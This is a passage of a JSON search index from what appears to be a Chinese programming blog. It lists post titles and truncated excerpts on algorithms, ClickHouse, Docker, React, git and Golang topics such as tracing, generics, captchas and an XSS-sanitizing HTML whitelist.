每次","lvl0":"127.单词接龙","lvl1":null,"lvl2":"摘要","objectID":"a119a90226426e9c7e159532dab55f29","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%97%AE%E9%A2%98/bfs%E5%8D%95%E8%AF%8D%E5%8F%98%E6%8D%A2/127.%E5%8D%95%E8%AF%8D%E6%8E%A5%E9%BE%99/"},{"content":"629. K个逆序对数组 Difficulty: 困难 给出两个整数 n 和 k，找出所有包含从 1 到 n 的数字，且恰好拥有 k 个逆序对的不同的数组的个数。 逆序对的定义如下：对于数组的第","lvl0":"629.k个逆序对数组","lvl1":null,"lvl2":"摘要","objectID":"baa0735c242af1d89c2de6ba7e7ee009","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E6%9E%9A%E4%B8%BE%E4%B8%AA%E6%95%B0/lc.629.k%E4%B8%AA%E9%80%86%E5%BA%8F%E5%AF%B9%E6%95%B0%E7%BB%84/"},{"content":"ac自动机算法 ac自动机图示 KMP 算法原理 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #include \u0026lt;bits/stdc++.h\u0026gt;#define next abcdefg using namespace std; const int MAXN = 1E6+10; int next[MAXN]; int","lvl0":"ac自动机","lvl1":null,"lvl2":"摘要","objectID":"b1e166b8bd4591edfbf23be12342e9bb","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/ac%E8%87%AA%E5%8A%A8%E6%9C%BA/"},{"content":"antd 自定义 hooks 表格 样例 第一步 自定义 hooks api 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53","lvl0":"antd的使用 自定义 hooks 表格增删查改","lvl1":null,"lvl2":"摘要","objectID":"d5b9bce1de2f0c03653c327a6729eba5","tags":["react","骚操作"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/antd%E4%BD%BF%E7%94%A8/react-%E8%87%AA%E5%AE%9A%E4%B9%89-hooks-%E8%A1%A8%E6%A0%BC%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"},{"content":"autohotkey修改快捷键 https://www.cnblogs.com/tengzijian/p/14493559.html [blind原理](当按键序列中首个项目为 {Blind} 时, 如果 Alt/Control/Shift/Win 在发送开始时为按下的状态则不松开.) 1 2 3 4 5 6 7 8 9","lvl0":"autohotkey修改快捷键","lvl1":null,"lvl2":"摘要","objectID":"f4444fcf96f20a335ecbe7eda36976ea","tags":null,"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/autohotkey/autohotkey%E4%BF%AE%E6%94%B9%E5%BF%AB%E6%8D%B7%E9%94%AE/"},{"content":"axios拦截器","lvl0":"axios拦截器使用","lvl1":null,"lvl2":"摘要","objectID":"4088b8ef55122f96205acf32f13f87fa","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/axios%E6%8B%A6%E6%88%AA%E5%99%A8/"},{"content":"写项目时候遇到的问题 个人写毕业设计的时候 用了官网给的 bootstrap 样式，觉得 有点难改， 这里上网 找到了一个 好看的 样式 ，可以用这个网站的样式 代替官网的那些样","lvl0":"bootstrap样式太丑，看着恶心","lvl1":null,"lvl2":"摘要","objectID":"3d54f6e489caae90e09c0bdcf5d50e25","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/bootstrap/bootstrap-%E6%A0%B7%E5%BC%8F%E5%A4%AA%E4%B8%91%E6%80%8E%E4%B9%88%E5%8A%9E/"},{"content":"b站源码 - lru缓存学习 参考leetcode .146. LRU缓存题 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41","lvl0":"b站源码-lru缓存学习","lvl1":null,"lvl2":"摘要","objectID":"20465421bac4f7f17376f7dd106a7907","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/b%E7%AB%99%E6%BA%90%E7%A0%81%E6%8B%9C%E8%AF%BB/b%E7%AB%99%E6%BA%90%E7%A0%81-lru%E7%BC%93%E5%AD%98%E5%AD%A6%E4%B9%A0/"},{"content":"b站源码拜读-推荐算法实现原理 参考博客 首先像大多数的推荐算法一样，小破站的视频推荐也是通过对各项数据进行加权求得视频权重然后在进行再区分，提","lvl0":"b站源码拜读-推荐算法","lvl1":null,"lvl2":"摘要","objectID":"fe6fd7156ac987d8272b3d31f0b916dc","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/b%E7%AB%99%E6%BA%90%E7%A0%81%E6%8B%9C%E8%AF%BB/b%E7%AB%99%E6%BA%90%E7%A0%81%E6%8B%9C%E8%AF%BB-%E6%8E%A8%E8%8D%90%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0/"},{"content":"Linux cgroup原理 参考文章 参考视频教程 Docker 核心技术主要从以下几个方面实现： 命名空间(namespace):通过进程命名空间，将docker进程","lvl0":"cgroup原理","lvl1":null,"lvl2":"摘要","objectID":"cac36b73b82f5739396eacc1a3e5c408","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%AE%B9%E5%99%A8%E6%8A%80%E6%9C%AF/cgroup%E5%8E%9F%E7%90%86/"},{"content":"chrome快捷键 1. 标签页和窗口快捷键 操作 快捷键 打开新窗口 ⌘ + n 在无痕模式下打开新窗口 ⌘ + Shift + n 打开新的标签页，并跳转到该标签页 ⌘ + t 重新打","lvl0":"chrome快捷键记录","lvl1":null,"lvl2":"摘要","objectID":"20245fa430ca0a27278f943e5c3b14ac","tags":null,"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/keymap/chrome-keymap/"},{"content":"clickhouse mergeTree具体学习 百度网盘：https://pan.baidu.com/s/19gFo-FhMuQVUu7zSs4xUZQ，提取码","lvl0":"clickhouse mergeTree引擎","lvl1":null,"lvl2":"摘要","objectID":"733b38708cc77e9b7c20e60828af77ec","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B7%A5%E5%85%B7/clickhouse/%E5%85%B6%E4%BB%96/mergetree%E5%BC%95%E6%93%8E%E8%AE%B0%E5%BD%95/"},{"content":"clickhouse 安装部署记录 安装 docker-compose 参考我的博客 参考其他博客 1 2 3 sudo curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose docker-compose --version 去 GitHub上找到写好的 配置 参考项目 1 2 git clone git@github.com:rongfengliang/clickhouse-docker-compose.git cd clickhouse-docker-compose/ 1 2 3 4 5","lvl0":"clickhouse 安装部署","lvl1":null,"lvl2":"摘要","objectID":"c351dadc997ad61a16f2a565360699cd","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B7%A5%E5%85%B7/clickhouse/%E5%85%B6%E4%BB%96/clickhouse%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2/"},{"content":"clickhouse 复杂SQL总结 数据分组 ，取出每组中最新的一条数据 1 2 3 4 5 6 7 8 9 10 11 12 select(argMax(tuple(t.y,t.m,t.d),tuple(t.m,t.d)))asYMDfrom(select2021asy,12asm,2asdunionallselect2021asy,11asm,20asdunionallselect2022asy,11asm,20asdunionallselect2022asy,11asm,30asd)tgroupbyt.y 这里用 union all 模拟表的数据， 首先，我们先根据年份 y分组， 然后取出每年","lvl0":"clickhouse 复杂SQL","lvl1":null,"lvl2":"摘要","objectID":"90e825c92852eb081902e7219e78362e","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B7%A5%E5%85%B7/clickhouse/%E5%A4%8D%E6%9D%82sql%E6%80%BB%E7%BB%93/%E5%A4%8D%E6%9D%82sql/"},{"content":"clickhouse 慢查询解决方案 单表 使用 prewhere 多表 in代替 join 【等值查询】 记录： 第一次使用 clickhouse join 了 2 张表，耗时 用了 2-3 秒，速度不够 看网上的解决方法是，使用 小表 放 左边，","lvl0":"clickhouse 慢查询解决方案","lvl1":null,"lvl2":"摘要","objectID":"82374051ab194c6d0ed736541d849657","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B7%A5%E5%85%B7/clickhouse/%E5%85%B6%E4%BB%96/clickhouse-%E6%85%A2%E6%9F%A5%E8%AF%A2%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"},{"content":"clickhouse基本概念 [TOC] 优点 底层支持数据的列式存储，支持压缩， 优化数据存储，优化索引数据 优化底层存储 缺点 不支持事务，不支持真正的删除、","lvl0":"clickhouse基本概念","lvl1":null,"lvl2":"摘要","objectID":"20081ab4c27904445e7e8f624442bcd9","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B7%A5%E5%85%B7/clickhouse/clickhouse%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/"},{"content":"clickhouse基础语法 物化视图 物化视图是一种特殊的物理表，“物化”(Materialized)视图是相对普通视图而言的。普通视图是虚拟","lvl0":"clickhouse基础语法","lvl1":null,"lvl2":"摘要","objectID":"ea21d8c42c4cb0709cc4fa4ec50006a0","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B7%A5%E5%85%B7/clickhouse/clickhouse%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"content":"ClickHouse架构 Clickhouse 的数据结构类似于关系型数据库，包括解析器，主要负责将SQL语句通过词法分析和语法分析，转化为计算机可以读取的抽象语","lvl0":"clickhouse架构，解决了什么问题","lvl1":null,"lvl2":"摘要","objectID":"92c7a12b7482cd2c69272902f0f19749","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B7%A5%E5%85%B7/clickhouse/clickhouse%E6%9E%B6%E6%9E%84/"},{"content":"clickhouse 使用背景 1.3 架构目标 1、海量数据的存储 2、实时导入 3、实时查询 4、可以进行多维度聚合分析 需要理解的概念 OLTP mysql 【 Online Transaction Processing 】 OLAP clickhouse 【Online Analytical Pr","lvl0":"clickhouse使用背景","lvl1":null,"lvl2":"摘要","objectID":"8c312c6bf6bbd95b8d2d22288a29cbf9","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B7%A5%E5%85%B7/clickhouse/clickhose%E4%BD%BF%E7%94%A8%E8%83%8C%E6%99%AF/"},{"content":"clickhouse相关的引擎 tinylog mysql 引擎 replaceingMerge Tree SummingMergeTree 引擎 AggregatingMergeTree 引擎 CK 引擎之CollapsingMergeTree 引擎 CK 引擎之多版本折叠树引擎 \u0026laquo;\u0026laquo;\u0026laquo;\u0026lt; HEAD clickhouse 的引擎","lvl0":"clickhouse相关的引擎","lvl1":null,"lvl2":"摘要","objectID":"44fb810012037b55da31820e1f4d67de","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B7%A5%E5%85%B7/clickhouse/clickhouse%E7%9B%B8%E5%85%B3%E7%9A%84%E5%BC%95%E6%93%8E/"},{"content":"clickhouse优化技巧 参考博客 参考博客2 [TOC] 执行引擎 不要用 join 使用 prewhere 代替 where 不是用 nullable 【nullable无法被索引】 近似去重 【uniq 代替 di","lvl0":"clickhouse优化技巧","lvl1":null,"lvl2":"摘要","objectID":"e9f9001afacb788b944b97cf8fa60fb2","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B7%A5%E5%85%B7/clickhouse/clickhouse%E4%BC%98%E5%8C%96%E6%8A%80%E5%B7%A7/"},{"content":"trace 可视化编程 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; \u0026#34;runtime/trace\u0026#34; ) func main() { f, err := os.Create(\u0026#34;trace.out\u0026#34;) if err != nil { panic(err) } defer f.Close() err = trace.Start(f) if err != nil { panic(err) } fmt.Println(\u0026#34;hello world\u0026#34;) trace.Stop() } 1","lvl0":"debug trace","lvl1":null,"lvl2":"摘要","objectID":"51f5a0f387d7f8b7f6440322be2503fd","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/%E5%85%AB%E8%82%A1%E6%96%87/debug-trace/"},{"content":"Docker compose 简介 Docker Compose是一个用来定义和运行复杂应用的Docker工具。一个使用Docker容器的应用，通常由多个容器组成。使用Docker","lvl0":"Docker compose","lvl1":null,"lvl2":"摘要","objectID":"5f68bf53aaff1ce9b09c6d1bfdf2db10","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%8E%9F%E7%90%86/docker%E5%AD%A6%E4%B9%A0/docker-compose/"},{"content":"Dockerfile Dockerfile概念 Dockerfile 是一个文本文件 包含一条条指令 每一条指令 构建一层 ，基于基础镜像，最终构建出全新的镜像 对于开发人员： 可以为开发团队提","lvl0":"Dockerfile","lvl1":null,"lvl2":"摘要","objectID":"e8ce69b666ba4b234199b1aecb543dc2","tags":["docker"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%8E%9F%E7%90%86/docker%E5%AD%A6%E4%B9%A0/dockerfile%E5%8E%9F%E7%90%86/"},{"content":"Docker 参考教程 参考菜鸟教程 docker run 的 参数记录 参数 解释 -a stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项； -d 后台运行容器，并返回容器ID； -p 指定端口映射， 格式为","lvl0":"docker基本命令学习","lvl1":null,"lvl2":"摘要","objectID":"31311287f46bccdb3f65951bcfd82ba2","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%8E%9F%E7%90%86/docker%E5%AD%A6%E4%B9%A0/docker%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/"},{"content":"参考学习 官网文档 参考视频学习 windows resize事件监听 参考视频 - 8分钟","lvl0":"echarts数据展示","lvl1":null,"lvl2":"摘要","objectID":"aa7bb22533bff53fc77b135a4a83da4c","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/echarts%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/"},{"content":"eclipse快捷键 1. 快捷键 1.1. 编辑 作用域 功能 快捷键 全局 查找并替换 Ctrl+F 文本编辑器 查找上一个 Ctrl+Shift+K 文本编辑器 查找下一个 Ctrl+K 文本编辑器 删除当前行 Ctrl+D 文本编辑","lvl0":"eclipse快捷键记录","lvl1":null,"lvl2":"摘要","objectID":"8d7631cafe4d3d495a27f63a652f2fc0","tags":null,"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/keymap/eclipse-keymap/"},{"content":"epoll优化参考 epoll优化参考-github开源项目 设想一个场景：有100万用户同时与一个进程保持着TCP连接，而每一时刻只有几十个或","lvl0":"epoll优化参考","lvl1":null,"lvl2":"摘要","objectID":"dc61d06240989d09d42847e1f8641d8e","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%8E%9F%E7%90%86/%E6%96%B0%E6%8A%80%E6%9C%AF%E6%9D%82%E8%AE%B0/epoll%E4%BC%98%E5%8C%96/"},{"content":"Feign远程调用 RestTemplate 调用的问题 restTeplate 调用存在以下问题 代码可读性差，编程体验不统一 复杂URL 难以维护 1 2 3 4 5 6 @FeignClient(\u0026#34;userService\u0026#34;) public interface UserClient { @GetMappling(\u0026#34;/api/user/{id}\u0026#34;) User findById(@PathVariable(\u0026#34;id\u0026#34;) String id) } 1 2 3 4 5 6","lvl0":"Feign远程调用","lvl1":null,"lvl2":"摘要","objectID":"f171a8663c459c9843ddddb297649a65","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/springcloud/feign%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8/"},{"content":"G1收集器优势 G1 可以充分利用服务器多核的优势 并行与并发 分代收集 空间整合 可预测的停顿 【精确指定 垃圾回收时间不超过 m】 G1 后台有一张表 remember set, 对 region 进行","lvl0":"G1收集器优势","lvl1":null,"lvl2":"摘要","objectID":"66161ce016aff1c1bc4f51110fb44667","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/java%E8%B0%83%E4%BC%98/g1%E6%94%B6%E9%9B%86%E5%99%A8/"},{"content":"git 查看远程分支 1 git remote -v","lvl0":"Git 查看远程分支","lvl1":null,"lvl2":"摘要","objectID":"aae72576cb0c01869a72d2c645e310d8","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E5%BC%80%E5%8F%91%E8%BD%AF%E4%BB%B6/git/git-%E6%9F%A5%E7%9C%8B%E8%BF%9C%E7%A8%8B%E5%88%86%E6%94%AF/"},{"content":"git生成ssh公钥 1 2 3 4 5 # 先生成配置邮箱 git config --global lyr git config --global lyr-2000@qq.com git config --list 1 2 3 4 5 cd ~ # linux 环境下操作 ssh-keygen -o cat .ssh/id_rsa.pub # 将内容复制上 GitHub ssh上面","lvl0":"Git 生成ssh公钥","lvl1":null,"lvl2":"摘要","objectID":"e67f83fba8d284e87a0abe202063544f","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E5%BC%80%E5%8F%91%E8%BD%AF%E4%BB%B6/git/git%E7%94%9F%E6%88%90%E5%85%AC%E9%92%A5/"},{"content":"参考项目 参考视频 CI 和 CD 的概念 CI很容易理解，就是持续集成。但是CD既可以指代码持续交付，也可理解为代码持续部署。CI和CD之间有很多相似的部","lvl0":"github action使用方法","lvl1":null,"lvl2":"摘要","objectID":"8674cc4e3addf8f75fc64c9bdd143b39","tags":["CI/CD"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%8E%9F%E7%90%86/%E5%88%86%E5%B8%83%E5%BC%8F%E5%9F%BA%E7%A1%80/ci-and-cd/github-action/"},{"content":"gitlab 学习 GitLab是一个代码仓库，用来管理代码。Jenkins是一个自动化服务平台，可以运行各种自动化构建、测试或部署任务。所以这两者结合起","lvl0":"gitlab学习","lvl1":null,"lvl2":"摘要","objectID":"9cd7d7afefe3ea8f555ddc9fa6d63b09","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E5%BC%80%E5%8F%91%E8%BD%AF%E4%BB%B6/git/gitlab/gitlab%E5%AD%A6%E4%B9%A0/"},{"content":"go generate 代码生成 这是一个尝试下的代码，实现golang解析注释，然后生成代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; ) //go:generate echo \u0026#34;hello world\u0026#34; func main____() { var ( pwd string","lvl0":"go generate代码生成","lvl1":null,"lvl2":"摘要","objectID":"d902e8eab08aad1a3eeee7948e2a30a2","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E9%AA%9A%E6%93%8D%E4%BD%9C/go-generate-%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/"},{"content":"golang 泛型使用 参考视频 1 2 3 4 5 6 7 8 9 10 11 12 13 14 package main import \u0026#34;fmt\u0026#34; func printSlice[T any](s []T) { for _, v := range s { fmt.Println(v) } } func main() { printSlice[int]([]int{1, 2, 3}) } 1 go run -gcflags=-G=3 .\\main.go","lvl0":"Golang 1.17泛型的使用","lvl1":null,"lvl2":"摘要","objectID":"e1c6e7936bc6985793ef34ccff4622c1","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/golang1.17%E6%B3%9B%E5%9E%8B/"},{"content":"golang epoll 问题引出： 如果需要处理百万TCP 连接，golang中要如何实现 需要了解的概念 水平触发和边缘触发 epoll 有两种模式，一种是水平触发，一种是边缘触","lvl0":"golang epoll 性能优化","lvl1":null,"lvl2":"摘要","objectID":"23c34fe93eb0ea443e2a524f3b59bb48","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/golang-epoll-%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"},{"content":"golang HTML 白名单 golang HTML 白名单工具 java html 白名单工具 1 2 3 4 5 6 7 8 9 10 11 12 13 package html import \u0026#34;github.com/microcosm-cc/bluemonday\u0026#34; func PreventXSS(html string) string { var policy = bluemonday.NewPolicy() policy.AllowStandardURLs() policy.AllowAttrs(\u0026#34;href\u0026#34;).OnElements(\u0026#34;a\u0026#34;) policy.AllowElements(\u0026#34;p\u0026#34;) policy.AllowElements(\u0026#34;div\u0026#34;) policy.AllowAttrs(\u0026#34;src\u0026#34;).OnElements(\u0026#34;img\u0026#34;) return policy.Sanitize(html) } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17","lvl0":"golang HTML白名单","lvl1":null,"lvl2":"摘要","objectID":"b18ac438745340f7c27316a9d2579491","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E9%A1%B9%E7%9B%AE%E5%B8%B8%E7%94%A8/golang-html-%E7%99%BD%E5%90%8D%E5%8D%95/"},{"content":"golang 反射获取 tag参考 golang反射 获取tag 2 golang参考3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37","lvl0":"Golang 反射参考","lvl1":null,"lvl2":"摘要","objectID":"1dbb6579199a22efe0e3b4816f61cbcd","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%B9%A0%E5%AD%A6%E4%B9%A0/golang-%E5%8F%8D%E5%B0%84/"},{"content":"golang 生成验证码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package captcha import ( \u0026#34;github.com/gin-contrib/sessions\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; log \u0026#34;github.com/sirupsen/logrus\u0026#34; \u0026#34;image/color\u0026#34; \u0026#34;image/png\u0026#34; \u0026#34;github.com/afocus/captcha\u0026#34; ) //生成","lvl0":"Golang 生成验证码","lvl1":null,"lvl2":"摘要","objectID":"68f0c221a61ca836a410daa9e28552f0","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E9%A1%B9%E7%9B%AE%E5%B8%B8%E7%94%A8/golang-%E7%94%9F%E6%88%90%E9%AA%8C%E8%AF%81%E7%A0%81/"},{"content":"golang 实现定时器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package util import ( \u0026#34;log\u0026#34; \u0026#34;time\u0026#34; ) //golang 定时器，启动的时候执行一次，以后每天晚上12点执行 func StartTimer(f func()) { go func() {","lvl0":"Golang 